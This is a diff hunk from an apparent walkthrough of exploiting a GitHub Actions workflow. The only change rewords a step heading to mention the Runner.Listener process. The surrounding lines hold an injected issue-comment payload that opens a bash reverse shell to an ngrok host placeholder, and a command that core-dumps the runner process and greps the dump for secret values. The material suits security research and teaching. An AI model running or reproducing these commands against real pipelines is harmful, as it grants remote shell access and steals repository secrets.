@@ -215,7 +215,7 @@ Body Issue Comment:
 Where is my bash ??
 ; bash -i >& /dev/tcp/<NGROK_IP>/<NGROK_PORT> 0>&1
 ```
-5. Dump and check those secrets
+5. Dump `Runner.Listener` process memory and check those secrets
 ``` bash
 sudo apt-get install -y gdb; sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{print $1}')"; grep -Eao '"[^"]+":\{"value":"[^"]*","isSecret":true\}' k.dump*
 ```
